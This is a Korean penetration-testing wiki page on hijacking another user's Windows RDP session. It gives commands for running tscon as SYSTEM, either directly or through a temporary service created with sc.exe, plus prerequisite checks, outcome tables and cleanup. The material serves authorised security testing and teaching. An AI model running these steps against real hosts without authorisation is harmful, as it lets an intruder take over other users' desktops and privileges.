---
tags:
  - 환경/windows
  - 서비스/rdp
시작조건: ["Windows RDP 또는 대화형 세션 확보", "대상 호스트에 다른 사용자의 RDP 세션 존재"]
필요권한: ["대상 호스트의 SYSTEM 명령 실행 권한", "서비스 생성 방식은 로컬 Administrators 그룹과 상승된 token", "대상 세션에 대한 Full Control 또는 Connect 권한"]
필요조건: ["탈취할 RDP session ID", "현재 세션 이름", "tscon.exe 사용 가능", "해당 Windows 버전·RDS 구성에서 SYSTEM 무암호 세션 연결 동작 확인"]
결과: ["다른 사용자의 기존 RDP desktop session", "해당 세션 사용자의 현재 GUI 접근과 권한"]
---

# RDP 세션 하이재킹

## 한 줄 판단

대상 Windows 호스트에서 SYSTEM 명령 실행·세션 Connect 권한을 가지고 다른 사용자의 RDP session ID가 확인된 후, 해당 Windows·RDS 구성이 SYSTEM `tscon` 무암호 연결을 허용하는 경우에만 그 세션을 현재 RDP session에 연결하여 대상 사용자의 기존 desktop과 현재 권한을 확인한다.

> 세션 연결은 다른 사용자의 desktop 작업과 연결 상태에 영향을 줄 수 있다. 임시 서비스를 사용한 경우 이번에 만든 정확한 서비스만 제거하며, 기존 세션·서비스는 종료하지 않는다.

Microsoft의 현재 `tscon` 문서는 다른 사용자 소유 세션을 연결할 때 소유자 암호와 Full Control 또는 Connect 권한을 요구한다. SYSTEM 서비스로 암호 없이 연결하는 경로는 교육 원천의 특정 환경에서 확인된 구현 의존 기법이며, 최신 Windows의 보장된 계약으로 표현하지 않는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 호스트 | 현재 RDP 세션과 탈취할 세션이 같은 Windows 호스트에 존재 | `hostname`, `query user` | 원격 호스트의 session ID와 혼동하지 않음 |
| 현재 세션 | 현재 사용자의 session name 확인 | `query user`에서 `>` 표시 행 확인 | RDP가 아닌 콘솔·서비스 세션을 구분 |
| 대상 세션 | 다른 사용자의 정확한 session ID 확인 | 사용자명, ID, 상태와 로그온 시각 대조 | 오래되거나 종료된 ID를 사용하지 않음 |
| 실행·세션 권한 | `tscon`이 SYSTEM으로 실행되고 대상 세션에 Full Control 또는 Connect 권한이 적용됨 | `whoami /all`, SYSTEM 서비스 실행과 RDS 세션 권한 확인 | 일반 관리자 token과 SYSTEM, Microsoft가 문서화한 암호 요구를 구분 |
| 버전·구성 | SYSTEM 무암호 연결 경로가 해당 환경에서 재현되는지 미확인 | 운영체제 버전·RDS 역할·보안 업데이트 확인 | 실패를 권한 부재로만 단정하지 않고 구현 차이로 분리 |

## 실행

### SYSTEM 셸에서 직접 연결

```cmd
hostname
whoami
query user
tscon <TARGET_SESSION_ID> /dest:<CURRENT_SESSION_NAME>
```

확인할 출력:

- 실행 전 `whoami`가 `nt authority\system`인지.
- `query user`의 대상 사용자·session ID와 현재 session name.
- 명령 뒤 현재 RDP desktop이 대상 사용자의 기존 세션으로 전환되는지.

### 로컬 관리자 세션에서 임시 SYSTEM 서비스 사용

변경 전 같은 이름의 서비스가 없는지 확인한다.

```cmd
query user
sc.exe query sessionhijack
sc.exe create sessionhijack binpath= "cmd.exe /c tscon <TARGET_SESSION_ID> /dest:<CURRENT_SESSION_NAME>"
net start sessionhijack
```

확인할 출력:

- `CreateService SUCCESS`와 `tscon` 실행 뒤 desktop 전환.
- `net start`가 서비스 상태 오류를 반환하더라도 `binpath` 명령 실행과 세션 전환 여부를 따로 확인한다.

새 desktop에서 대상 사용자와 권한을 확인한다.

```cmd
whoami
whoami /groups
whoami /priv
```

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| desktop이 대상 사용자의 기존 세션으로 전환되고 `whoami`가 일치 | RDP session 연결 성공 | 다른 Windows 사용자의 GUI 세션 | [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]에서 계정·권한·호스트 재평가 |
| 대상 사용자가 고권한 도메인 그룹을 가지며 실제 관리 작업이 가능 | 고권한 사용자 session 확보 | 고권한 Windows 세션 | [[고권한 세션 확보 후 후속 판단]] |
| session ID가 없거나 상태가 바뀜 | 대상 세션이 종료·재연결됨 | 대상 session 미확정 | `query user`를 다시 실행해 현재 ID 확인 |
| `Access is denied` 또는 암호 요구 | SYSTEM 실행, Full Control·Connect 권한 또는 다른 사용자 세션의 암호 조건 미충족 | 세션 전환 실패 | 현재 token·서비스 실행 주체·RDS 권한과 해당 버전의 문서화된 `tscon` 계약 확인 |
| 명령 성공처럼 보이나 desktop이 바뀌지 않음 | 잘못된 대상 ID·destination 또는 Windows·RDS 구현 제한 | 세션 전환 실패 | 현재 session name, 대상 ID와 운영체제·RDS 구성 확인 |

## 확인할 출력과 권한

- `query user`는 세션 단서, `tscon` 뒤 desktop 전환은 세션 연결, 새 desktop의 `whoami /all`은 실제 실행 계정과 권한을 보여 준다.
- 대상 사용자의 세션 연결과 비밀번호·hash 획득은 다른 결과다.

## 변경 영향과 복구

임시 서비스를 만들었다면 정확한 서비스만 제거한다.

```cmd
sc.exe stop sessionhijack
sc.exe delete sessionhijack
sc.exe query sessionhijack
```

- 기존에 같은 이름의 서비스가 있었다면 생성하지 않는다.
- 실행 전후 `query user`로 상태를 비교한다.

## 관련 서비스

- [[RDP 서비스]]

## 관련 도구

- [[tscon]]

## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]

## 참고 링크

- [Microsoft: tscon](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)
